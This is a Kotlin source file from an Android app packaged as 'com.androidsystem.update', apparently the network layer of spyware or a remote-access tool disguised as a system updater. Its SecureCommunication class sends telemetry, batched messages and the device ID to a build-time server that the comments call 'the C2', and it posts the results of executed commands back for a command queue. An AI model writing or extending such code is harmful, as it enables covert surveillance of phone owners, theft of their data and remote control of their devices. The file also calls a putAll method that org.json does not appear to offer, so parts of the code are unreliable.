package com.androidsystem.update.network

import android.content.Context
import android.util.Log
import com.androidsystem.update.BuildConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Drop-in replacement for the v3.1.0 SecureCommunication that adds
 * [sendCommandResult] used by the new command queue and OtaUpdater.
 *
 * The original v3.1.0 path (telemetry + batch send to /api/v2/*) is
 * preserved verbatim. New methods:
 *   - [sendCommandResult]  POST /api/v2/devices/<id>/result
 *
 * The transport target is the same BuildConfig.SERVER_URL (the Nove HTTP
 * server, not the Firebase RTDB) so binary uploads and result posts can
 * coexist with the RTDB command fanout.
 */
@Singleton
class SecureCommunication @Inject constructor(
    private val context: Context,
    private val networkManager: NetworkManager
) {

    companion object {
        private const val TAG = "SecureCommunication"
        private const val CONNECT_TIMEOUT = 30000
        private const val READ_TIMEOUT = 30000
    }

    enum class Priority { LOW, NORMAL, HIGH }

    data class TelemetryResult(val success: Boolean, val paired: Boolean = false)

    private data class ServerResponse(val ok: Boolean, val body: String)

    private val deviceId by lazy {
        android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    suspend fun sendTelemetry(data: JSONObject, priority: Priority = Priority.NORMAL): TelemetryResult =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext TelemetryResult(false)
            try {
                val payload = JSONObject(data.toString())
                if (!payload.has("device_id")) payload.put("device_id", deviceId)
                if (!payload.has("timestamp")) payload.put("timestamp", System.currentTimeMillis())
                val response = postToServer("/telemetry", payload.toString())
                val paired = try { JSONObject(response.body).optBoolean("paired", false) } catch (e: Exception) { false }
                TelemetryResult(response.ok, paired)
            } catch (e: Exception) { Log.e(TAG, "sendTelemetry failed", e); TelemetryResult(false) }
        }

    suspend fun sendBatch(batchData: String): Boolean = withContext(Dispatchers.IO) {
        if (!networkManager.isOnline()) return@withContext false
        try {
            val messages = JSONArray(batchData)
            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("messages", messages)
            }
            postToServer("/data", payload.toString()).ok
        } catch (e: Exception) { Log.e(TAG, "sendBatch failed", e); false }
    }

    /**
     * Post a command result back to the C2. The server route is
     * POST /api/v2/devices/:deviceId/result, which fans out via SSE.
     */
    suspend fun sendCommandResult(commandType: String, result: JSONObject): Boolean =
        withContext(Dispatchers.IO) {
            if (!networkManager.isOnline()) return@withContext false
            try {
                val body = JSONObject().apply {
                    put("type", commandType)
                    putAll(result)
                    put("ts", System.currentTimeMillis())
                }
                postToServer("/devices/$deviceId/result", body.toString()).ok
            } catch (e: Exception) { Log.e(TAG, "sendCommandResult failed", e); false }
        }

    private fun postToServer(endpoint: String, body: String): ServerResponse {
        val url = URL(BuildConfig.SERVER_URL + endpoint)
        val conn = url.openConnection() as HttpURLConnection
        return try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Device-Id", deviceId)
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.doOutput = true
            conn.outputStream.use { it.write(body.toByteArray()) }
            val code = conn.responseCode
            val text = if (code in 200..299) conn.inputStream?.bufferedReader()?.use { it.readText() } ?: ""
            else conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
            if (code !in 200..299) Log.w(TAG, "POST $endpoint -> $code: $text")
            ServerResponse(code in 200..299, text)
        } catch (e: Exception) { Log.e(TAG, "POST $endpoint failed", e); ServerResponse(false, "")
        } finally { conn.disconnect() }
    }
}
